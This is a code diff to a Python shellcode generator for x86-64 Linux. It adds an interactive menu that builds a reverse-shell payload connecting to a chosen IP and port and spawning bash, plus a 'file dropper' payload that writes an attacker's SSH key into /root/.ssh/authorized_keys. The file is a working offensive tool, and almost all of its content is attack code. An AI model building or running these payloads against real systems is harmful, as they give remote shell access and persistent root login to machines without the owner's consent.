@@ -4,6 +4,7 @@
 # IMPORTS
 
 import socket
+import os
 from sys import argv
 from random import randrange
 
@@ -11,8 +12,10 @@ from random import randrange
 # CONSTANTS
 
 # Syscalls
+SYS_WRITE = r"\x01"
+SYS_OPEN = r"\x02"
 SYS_SOCKET = r"\x29"
-SYS_CONNECT = r"\x2a"
+SYS_CONNECT = r"\x2b" # 2a + 1
 SYS_DUP2 = r"\x21"
 SYS_EXECVE = r"\x3b"
 SYS_EXIT = r"\x3c"
@@ -22,6 +25,8 @@ MOV = {
     "al": r"\xb0",
     "bl": r"\xb3",
     "dl": r"\xb2",
+    "si": r"\x66\xbe",
+    "dx": r"\x66\xba",
     "esi": r"\xbe",
     "rdi,rbx": r"\x48\x89\xdf",
     "rdi,r10": r"\x4c\x89\xd7",
@@ -31,7 +36,9 @@ MOV = {
     "rsi,rsp": r"\x48\x89\xe6",
     "rdi,rax": r"\x48\x89\xc7",
     "r10,rax": r"\x49\x89\xc2",
-    "rdx,rsp": r"\x48\x89\xe2"
+    "rdx,rsp": r"\x48\x89\xe2",
+    "r9,8bytes": r"\x49\xb9",
+    "rsi,rsp": r"\x48\x89\xe6"
 }
 
 XOR = {
@@ -50,12 +57,14 @@ INC = {
 PUSH = {
     "rax": r"\x50",
     "rbx": r"\x53",
+    "rcx": r"\x51",
     "rdx": r"\x52",
     "rdi": r"\x57",
     "rsi": r"\x56",
+    "r9": r"\x41\x51",
     "port": r"\x66\x68",
     "2": r"\x66\x6a\x02",
-    "-i": r"\x66\x68\x2d\x69"
+    "-i": r"\x66\x68\x2d\x69",
 }
 
 SUB = {
@@ -86,10 +95,13 @@ SHELL = [
 # FUNCTIONS
 
 
-def str_hex(buffer: bytes) -> str:
+def chunk(line: str, n: int) -> list[str]:
+    return [line[i:i+n] for i in range(0, len(line), n)]
+
+
+def bytes_to_opcode(buffer: bytes) -> str:
     line = buffer.hex()
-    n = 2
-    splitted = [line[i:i+n] for i in range(0, len(line), n)]
+    splitted = chunk(line, 2)
     return r"\x" + r"\x".join(splitted)
 
 
@@ -101,7 +113,7 @@ def gen_ip_in_hex(splited_ip, inc: int):
         new_ip_parts.append(str(new_part))
     new_ip_address = ".".join(new_ip_parts)
     var = socket.inet_aton(new_ip_address)
-    return str_hex(var)
+    return bytes_to_opcode(var)
 
 
 def clean_by_xor(reg: str):
@@ -257,44 +269,120 @@ class Shellcode:
         self.__code += MOV["al"] + SYS_EXIT
         self.__code += SYSCALL
 
-    def open(file: str):
-        pass
+    def open(self, file: str):
+        file = bytes_to_opcode(file.encode())
+        splitted = chunk(file, 32)
 
-    def write(buffer: str):
-        pass
+        # Aligment
+        if len(splitted[-1]) < 32:
+            to_fill = int((32 - len(splitted[-1])) / 4)
+            file = r"\x2f"*to_fill + file
+            splitted = chunk(file, 32)
+
+        splitted.reverse()
+
+        self.clean("rcx")
+
+        # Write filename to stack
+        self.__code += PUSH["rcx"]
+        for piece in splitted:
+            self.__code += MOV["r9,8bytes"] + piece
+            self.__code += PUSH["r9"]
+
+        self.__code += MOV["rdi,rsp"]
+        self.__code += MOV["al"] + SYS_OPEN
+        self.__code += MOV["si"] + r"\x41\x02" # Perm: 0600
+        self.__code += MOV["dx"] + r"\x80\x01" # O_CREAT | O_WRONLY | O_TRUNC
+        self.__code += SYSCALL
+
+
+    def write(self, buffer: str):
+        buffer = bytes_to_opcode(buffer.encode())
+        splitted = chunk(buffer, 32)
+
+        if len(splitted[-1]) < 32:
+            to_fill = int((32 - len(splitted[-1])) / 4)
+            buffer = buffer + r"\x10"*to_fill
+            splitted = chunk(buffer, 32)
+        
+        splitted.reverse()
+
+        # Get buffer lenght
+        count = len(splitted) * 8
+        count = r"\x" + chr(count).encode().hex()        
+
+        self.__code += MOV["rdi,rax"]  # file descriptor
+        self.clean("rax")
+        self.clean("rcx")
+        self.clean("rdx")
+        
+        # Write buffer to the stack
+        self.__code += PUSH["rcx"]
+        for piece in splitted:
+            self.__code += MOV["r9,8bytes"] + piece
+            self.__code += PUSH["r9"]
+
+        self.__code += MOV["rsi,rsp"] # Buffer address
+        self.__code += MOV["al"] + SYS_WRITE
+        self.__code += MOV["dl"] + count
+        self.__code += SYSCALL
 
 
 # MAIN
 
 def main():
 
-    ssh_pub =   "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMxGorFJ1um5o7CxNy8fVaamFZzgoSO39/P2ItEf6fbd"
-    target =    "/root/.ssh/authorized_keys"
+    os.system("clear")
+    print("""
+    ShellcodeGenerator v1.0
 
-    # Check for valid arguments
-    #if len(argv) != 3:
-    #    print("Error: 3 arguments expected !\nExemple: main.py 127.0.0.1 8989")
-    #z    exit(1)
+    Select which shellcode to generate :
 
-    # Init Shellcode object
-    sc = Shellcode()
+    1. Reverse shell
+    2. File dropper
+    """)
 
-    # Reverse shell
-    sc.clean_all()
-    sc.create_socket(2, 1)
-    sc.connect_socket(argv[1], int(argv[2]))
-    sc.link_io()
-    sc.exec_bash()
-    sc.exit()
+    index = input("Enter index (ex: 1) : ")
 
-    # SSH dropper
-    #sc.clean_all()
-    #sc.open(target)
-    #sc.write(ssh_pub)
-    #sc.exit()
+    match index:
+        case "1":
+            os.system("clear")
+            ip = input("Enter IP to connect (ex: 127.0.0.1) : ")
+            port = input("Enter port to connect (ex: 8989) : ")
+            
+            sc = Shellcode()
+            sc.clean_all()
+            sc.create_socket(2, 1)
+            sc.connect_socket(ip, int(port))
+            sc.link_io()
+            sc.exec_bash()
+            sc.exit()
+            
+            os.system("clear")
+            print(sc)
+            exit(0)
 
-    # Print final shellcode
-    print(sc)
+
+        case "2":
+            source = input("Enter file to drop on host (ex: ~/.ssh/id_ed25519.pub) : ")
+            destination = input("Enter where to drop on target (ex: /root/.ssh/authorized_keys) : ")
+
+            with open(source, "r") as f:
+                source_file = f.read()
+
+            sc = Shellcode()
+            sc.clean_all()
+            sc.open(destination)
+            sc.write(source_file)
+            sc.exit()
+
+            os.system("clear")
+            print(sc)
+            exit(0)
+
+        case _:
+            print("Error: bad input")
+            exit(1)
 
 
 if __name__ == "__main__":
